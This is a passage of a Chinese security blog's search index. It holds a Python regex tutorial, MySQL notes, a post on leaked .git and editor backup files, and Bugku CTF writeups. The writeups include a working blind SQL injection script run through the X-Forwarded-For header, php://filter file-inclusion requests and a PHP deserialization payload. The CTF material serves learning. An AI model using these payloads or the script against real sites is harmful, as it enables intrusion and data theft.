?file=class.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:13:&quot;flag_good.php&quot;;} 得到flag： flag{132e9a8fcba14cbbaaad09c76d15bd07}","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"python正则表达式","slug":"python正则表达式","date":"2018-11-08T16:36:18.000Z","updated":"2019-05-29T12:45:04.711Z","comments":true,"path":"2018/11/09/python正则表达式/","link":"","permalink":"http://yoursite.com/2018/11/09/python正则表达式/","excerpt":"Python正则表达式","text":"Python正则表达式 正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。 re 模块，它提供Perl风格的正则表达式模式。使 Python语言拥有全部的正则表达式功能。 compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。 re模块re.match函数re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。 函数语法： re.match(pattern,string,flags=0) 参数说明： pattern: 匹配正则表达式 strung：要匹配的字符 flags：标志位，用于控制正则表达式的匹配方式，如是否区分大小写，多行匹配等等 匹配成功re.match方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 group(num=0) 匹配的整个表达式的字符串，group()可以一次输入多个组号,在这种情况下它将返回一个包含那些组所对值得元组 groups() 返回一个包含所有小组字符串的元组，从1到所含的小组号 #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot; matchObj = re.match( r&#39;(.*) are (.*?) .*&#39;, line, re.M|re.I) if matchObj: print &quot;matchObj.group() : &quot;, matchObj.group() print &quot;matchObj.group(1) : &quot;, matchObj.group(1) print &quot;matchObj.group(2) : &quot;, matchObj.group(2) else: print &quot;No match!!&quot; 以上实例执行结果如下： matchObj.group() : Cats are smarter than dogs matchObj.group(1) : Cats matchObj.group(2) : smarter 正则表达式修饰符 - 可选标志 re.l 使匹配对大小写不敏感 re.L 做本地化识别(locale-aware)匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使.匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解 re.search方法re.search：扫描整个字符串并返回第一个成功的匹配。 #!/usr/bin/python # -*- coding: UTF-8 -*- import re print(re.search(&#39;www&#39;, &#39;www.runoob.com&#39;).span()) # 在起始位置匹配 print(re.search(&#39;com&#39;, &#39;www.runoob.com&#39;).span()) # 不在起始位置匹配 以上实例运行输出结果为： (0, 3) (11, 14) #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot;; searchObj = re.search( r&#39;(.*) are (.*?) .*&#39;, line, re.M|re.I) if searchObj: print &quot;searchObj.group() : &quot;, searchObj.group() print &quot;searchObj.group(1) : &quot;, searchObj.group(1) print &quot;searchObj.group(2) : &quot;, searchObj.group(2) else: print &quot;Nothing found!!&quot; 以上实例执行结果如下： searchObj.group() : Cats are smarter than dogs searchObj.group(1) : Cats searchObj.group(2) : smarter re.match与re.search的区别re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 #!/usr/bin/python import re line = &quot;Cats are smarter than dogs&quot;; matchObj = re.match( r&#39;dogs&#39;, line, re.M|re.I) if matchObj: print &quot;match --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; matchObj = re.search( r&#39;dogs&#39;, line, re.M|re.I) if matchObj: print &quot;search --&gt; matchObj.group() : &quot;, matchObj.group() else: print &quot;No match!!&quot; 以上实例运行结果如下： No match!! search --&gt; matchObj.group() : dogs 检索和替换Python 的re模块提供了re.sub用于替换字符串中的匹配项。 语法： re.sub(pattern, repl, string, count=0, flags=0) 参数： - pattern : 正则中的模式字符串。 - repl : 替换的字符串，也可为一个函数。 - string :要被查找替换的原始字符串。 - count :模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。 例子： #!/usr/bin/python # -*- coding: UTF-8 -*- import re phone = &quot;2004-959-559 # 这是一个国外电话号码&quot; # 删除字符串中的 Python注释 num = re.sub(r&#39;#.*$&#39;, &quot;&quot;, phone) print &quot;电话号码是: &quot;, num # 删除非数字(-)的字符串 num = re.sub(r&#39;\\D&#39;, &quot;&quot;, phone) print &quot;电话号码是 : &quot;, num 以上实例执行结果如下： 电话号码是: 2004-959-559 电话号码是 : 2004959559 repl 参数是一个函数的情况 #!/usr/bin/python # -*- coding: UTF-8 -*- import re def double(a): value = int(a.group(&#39;value&#39;)) print value return str(value * 2) s = &#39;asas55da546sdsa15661&#39; print(re.sub(&#39;(?P&lt;value&gt;\\d+)&#39;, double, s)) 输出结果 55 546 15661 asas110da1092sdsa31322 [Finished in 0.1s] re.compile()函数compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。 re.compile(pattern[, flags]) 参数 - pattern: 一个字符串的正则表达式 - flags: 可选，表示匹配模式 - re.l 忽略大小写 - re.L 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境 - re.M 多行模式 - re.S 即为.并且包含换行符在内的任意符号（.不包括换行符） - re.U 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库 - re.X 为了增加可读性，忽略空格和 # 后面的注释 import re pattern = re.compile(r&#39;\\d+&#39;) m = pattern.match(&#39;one12twothree34four&#39;) # 查找头部，没有匹配 print m m = pattern.match(&#39;one12twothree34four&#39;, 2, 10) # 从&#39;e&#39;的位置开始匹配，没有匹配 print m m = pattern.match(&#39;one12twothree34four&#39;, 3, 10) # 从&#39;1&#39;的位置开始匹配，正好匹配 print m 三次输出的结果为： None None &lt;_sre.SRE_Match object at 0x0340E640&gt; # 可以看出当匹配成功时返回一个 Match 对象 # 这些可以接受对象的函数输出： print m.group(0) print m.start(0) print m.end(0) print m.span(0) #输出为： 12 3 5 (3, 5) group([group1,…])方法用于获得一个或多个分组匹配的字符串，当要获取整个匹配的子串时，可直接使用 group()或者group(0)； start([group]) 方法用于获取分组匹配的子串在整个整个字符串中起始的位置(子串第一个字符的索引)，参考默认值为0； end([group]) 方法用于获取分组匹配的子串在整个整个字符串中结束的位置(子串最后一个字符的索引+1)，参考默认值为0； span([group]) 方法返回 (start(group), end(group))。 import re pattern = re.compile(r&#39;([a-z]+) ([a-z]+) ([a-z]+)&#39;, re.I) m = pattern.match(&#39;Hello World Wide Web&#39;) print m.groups() # 等价于 (m.group(1), m.group(2), ...) print m.span(1) # 返回第一个分组匹配成功的子串的索引 输出结果： (&#39;Hello&#39;, &#39;World&#39;, &#39;Wide&#39;) (0, 5) [Finished in 0.1s] findall函数在字符串中找到正则表达式所匹配的所有子串，并返回到一个列表，如果没有找到匹配的，则返回空列表。 注意：match和search是匹配一次findall匹配所有 findall(string[, pos[, endpos]]) 参数 - string 待匹配的字符串 - pos 可选参数，指定字符串的起始位置，默认为0 - endpos 可选参数，指定字符串的结束位置，默认为字符串的长度 import re findnumber = &#39;ahsd5asdj656asd645asd&#39; pattern = re.compile(r&#39;\\d+&#39;) m = pattern.findall(findnumber) n = pattern.findall(findnumber,0,10) print m print n 输出结果： [&#39;5&#39;, &#39;656&#39;, &#39;645&#39;] [&#39;5&#39;, &#39;6&#39;] [Finished in 0.1s] re.finditer和 findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 re.finditer(pattern, string, flags=0) 实例 import re findnumber = &#39;ahsd5asdj656asd645asd&#39; p = re.finditer(r&#39;\\d+&#39;, findnumber) for a in p: print a.group() 输出为： 5 656 645 re.splitsplit 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下： re.split(pattern, string[, maxsplit=0, flags=0]) 参数： pattern 匹配的正则表达式 string 要匹配的字符串。 maxsplit 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。 flags 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 b = re.split(&#39;(\\d+)&#39;, &#39; asd, 541sad, asd5.5415&#39;) print b 输出结果 [&#39; asd, &#39;, &#39;541&#39;, &#39;sad, asd&#39;, &#39;5&#39;, &#39;.&#39;, &#39;5415&#39;, &#39;&#39;] 正则表达式对象re.RegexObjectre.compile() 返回 RegexObject 对象。 re.MatchObjectgroup() 返回被 RE 匹配的字符串。 start() 返回匹配开始的位置 end() 返回匹配结束的位置 span() 返回一个元组包含匹配 (开始,结束) 的位置 正则表达式修饰符 re.I 使匹配对大小写不敏感 re.L 做本地化识别（locale-aware）匹配 re.M 多行匹配，影响 ^ 和 $ re.S 使 . 匹配包括换行在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B. re.X 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。 正则表达式模式 ^ 匹配字符串的开头 $ 匹配字符串的末尾。 . 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 […] 用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’ [^…] 不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。 re* 匹配0个或多个的表达式。 re+ 匹配1个或多个的表达式。 re? 匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式 re{ n} 精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。 re{ n,} 匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于 “o*”。 re{ n, m} 匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式 a| b 匹配a或b (re) 匹配括号内的表达式，也表示一个组 (?imx) 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 (?-imx) 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。 (?: re) 类似 (…), 但是不表示一个组 (?imx: re) 在括号中使用i, m, 或 x 可选标志 (?-imx: re) 在括号中不使用i, m, 或 x 可选标志 (?#…) 注释. (?= re) 前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。 (?! re) 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功 (?&gt; re) 匹配的独立模式，省去回溯。 \\w 匹配字母数字及下划线 \\W 匹配非字母数字及下划线 \\s 匹配任意空白字符，等价于 [\\t\\n\\r\\f]. \\S 匹配任意非空字符 \\d 匹配任意数字，等价于 [0-9]. \\D 匹配任意非数字 \\A 匹配字符串开始 \\Z 匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。 \\z 匹配字符串结束 \\G 匹配最后匹配完成的位置。 \\b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \\B 匹配非单词边界。’er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \\n, \\t, 等. 匹配一个换行符。匹配一个制表符。等 \\1…\\9 匹配第n个分组的内容。 \\10 匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"mysql 数据库的基本操作","slug":"mysql-数据库的基本操作","date":"2018-10-08T16:21:17.000Z","updated":"2019-05-29T12:33:43.168Z","comments":true,"path":"2018/10/09/mysql-数据库的基本操作/","link":"","permalink":"http://yoursite.com/2018/10/09/mysql-数据库的基本操作/","excerpt":"mysql 数据库的操作","text":"mysql 数据库的操作 一些常用的命令1.增加一个字段 alter table 表名字 add COLUMN 新列名 VARCHAR(20) DEFAULT NULL; //增加一个字段，默认为空 alter table user add COLUMN new2 VARCHAR(20) NOT NULL; //增加一个字段，默认不能为空 2.删除一个字段 alter table 表名字 DROP COLUMN 要删除的列名; //除一个字段 3.修改一个字段 alter table user MODIFY new1 VARCHAR(10); //修改一个字段的类型 alter table user CHANGE new1 new4 int; //修改一个字段的名称，此时一定要重新 //主键 alter table tabelname add new_field_id int(5) unsigned default 0 not null auto_increment ,add primary key (new_field_id); //增加一个新列 alter table t2 add d timestamp; alter table infos add ex tinyint not null default ‘0′; //删除列 alter table t2 drop column c; //重命名列 alter table t1 change a b integer; //改变列的类型 alter table t1 change b b bigint not null; alter table infos change list list tinyint not null default ‘0′; //重命名表 alter table t1 rename t2; 加索引 mysql&gt; alter table tablename change depno depno int(5) not null; mysql&gt; alter table tablename add index 索引名 (字段名1[，字段名2 …]); mysql&gt; alter table tablename add index emp_name (name); 加主关键字的索引 mysql&gt; alter table tablename add primary key(id); 加唯一限制条件的索引 mysql&gt; alter table tablename add unique emp_name2(cardnumber); 删除某个索引 mysql&gt;alter table tablename drop index emp_name; 增加字段： mysql&gt; ALTER TABLE table_name ADD field_name field_type; 修改原字段名称及类型： mysql&gt; ALTER TABLE table_name CHANGE old_field_name new_field_name field_type; 删除字段： mysql&gt; ALTER TABLE table_name DROP field_name; mysql修改字段长度 alter table 表名 modify column 字段名 类型; 例如 数据库中user表 name字段是varchar(30) 可以用 alter table user modify column name varchar(50) ; 数据库的操作 net stop mysql //关闭msql net start mysql //开启mysql mysql -uroot -proot //登陆mysql show databases； //查看数据库 use test //切换到test数据库 show tables； //查看所有表 select * from user； //查看表中数据 desc user； //查看表结构 exit； //退出mysql客户端 create database user； //创建数据库 use user； //切换数据库 drop database user； //删除数据库 创建表： create table user（ id int， name varchar（30）， pass varchar（30） ); rename table user to user1; //修改表名 drop table user1 //删除表 insert into user(id) values(&quot; &quot;) select count(*) from user; 查询数据的总行数 asc是表示升序，desc表示降序 exit; 退出 select database(); 查询现在所在的库的名字； select vresion()； 查询Mysql的版本信息； select User(); 查询使用者的权限； select @@datadir; 查询Mysql的存储位置；","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"文件泄露","slug":"文件泄露","date":"2018-09-08T06:13:02.000Z","updated":"2019-06-05T09:01:46.733Z","comments":true,"path":"2018/09/08/文件泄露/","link":"","permalink":"http://yoursite.com/2018/09/08/文件泄露/","excerpt":"文件泄露前言文件泄露大多数是因为程序员操作不当而引起的","text":"文件泄露前言文件泄露大多数是因为程序员操作不当而引起的 .git源码泄漏原因在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 .DS_Store文件泄漏原因.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。 .hg源码泄漏原因hg是类似于git的一种分布式管理，hg初始化的时候会生成hg文件， 编辑器临时文件泄露vim编辑器vim临时文件程序员使用vim编辑器编写一个index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php。 恢复文件： 前提是.index.php.swp存在于该目录下 vim -r 恢复的文件名 vim备份文件默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；例如：index.php的备份文件则为index.php~ PHPSTORM使用phpstorm新建项目时，会生成一个.idea文件夹，这个文件夹有一个workspace.xml，访问可以得到一些信息。 网站源码备份文件泄露www.rar/nyist.tar.gz/web.zip等压缩文件名","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"bugku insert into 注入","slug":"bugku-insert-into-注入","date":"2018-05-10T15:42:22.000Z","updated":"2019-05-29T12:42:44.067Z","comments":true,"path":"2018/05/10/bugku-insert-into-注入/","link":"","permalink":"http://yoursite.com/2018/05/10/bugku-insert-into-注入/","excerpt":"INSERT INTO 注入","text":"INSERT INTO 注入 打开题目 已经给出源码 error_reporting(0); function getIp(){ $ip = &#39;&#39;; if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){ $ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; }else{ $ip = $_SERVER[&#39;REMOTE_ADDR&#39;]; } $ip_arr = explode(&#39;,&#39;, $ip); return $ip_arr[0]; } $host=&quot;localhost&quot;; $user=&quot;&quot;; $pass=&quot;&quot;; $db=&quot;&quot;; $connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;); mysql_select_db($db) or die(&quot;Unable to select database&quot;); $ip = getIp(); echo &#39;your ip is :&#39;.$ip; $sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;; mysql_query($sql); 这里可以看出注入点在最后的 $sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;; ` $ip 可以通过 X-ForWarded-For 伪造IP 来进行http头注入 由于没有回显 也屏蔽了报错 所以只能考虑基于时间的盲注 之前时间延时盲注都是用的 if(exp1,exp2,exp3) 但是这次 他将’,’ 过滤了 $ip_arr = explode(&#39;,&#39;, $ip); return $ip_arr[0]; 所以用 case when exp1 then sleep(4) else 1 end来绕过 “,”的限制 exp1 中要用到substr来进行剪切，这个函数substr(str,1,1) 又是存在 “,” , 于是这里我又用 substr (str) from 1 for 1 来绕过 “,”的限制 构成的完整语句为 insert into client_ip (ip) values (&#39; 1&#39; and (case when (length((select database())) = 14) then sleep(4) else 1 end) # &#39;) 最后附上脚本： import requests url=&quot;http://123.206.87.240:8002/web15/&quot; flag=&quot;&quot; for i in range(1,6): for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&quot;: #data = &quot;11&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot; #client_ip,flag #data = &quot;11&#39; and (case when (substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot; #flag data = &quot;11&#39; and (case when (substr((select group_concat(flag) from flag) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot; headers={&#39;X-ForWarded-For&#39;:data} try: result=requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag+=str1 print flag break print flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"bugku welcome to the bugkuctf wp","slug":"bugku-welcome-to-the-bugkuctf-wp","date":"2018-05-08T15:42:22.000Z","updated":"2019-06-05T09:01:59.050Z","comments":true,"path":"2018/05/08/bugku-welcome-to-the-bugkuctf-wp/","link":"","permalink":"http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/","excerpt":"welcome to the bugkuctf","text":"welcome to the bugkuctf 点击连接 之后查看源码 发现 you are not the number of bugku ! &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; 发现了需要get传递三个参数 $_GET[‘txt’] === $user === “welcome to the bugkuctf” $file = hint.php 就想到了 php伪协议 文件包含漏洞 GET /test1/index.php? txt=php://input &amp;file=php://filter/read=convert.base64-encode/resource=hint.php &amp;password= POST welcome to the bugkuctf 可以读出来 hint.php &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); } } } ?&gt; 同理 也可以读出index.php的代码 &lt;?php $txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;?????????????????????flag???&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo &quot;you are not the number of bugku ! &quot;; } ?&gt; &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; hint.php 提示的flag.php 从index.php可以看到对关键词flag进行了preg_match 所以不能直接读出代码内容 hint.php 定义的是一个类 注意到中间有一个__tostring方法， 这个函数就是把类当作字符串执行时会自动执行的一个函数。 __tostring 方法执行时，将变量$file作为文件名输出文件内容，结合提示flag.php，猜测屏蔽的flag.php文件在此打开 将hint.php中的Flag方法当做字符串执行时，会自动执行__tostring方法，只有echo，只能输出一个或多个字符串，所以构造password为Flag类型，其中的string变量flie=flag.php即可 看到了代码中有 include($file); $password = unserialize($password); echo $password; 因此知道需要构造序列化对象payload为 GET /test1/index.php?txt=php://input &amp;file=hint.php &amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} POST welcome to the bugkuctf 就可得到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]}]}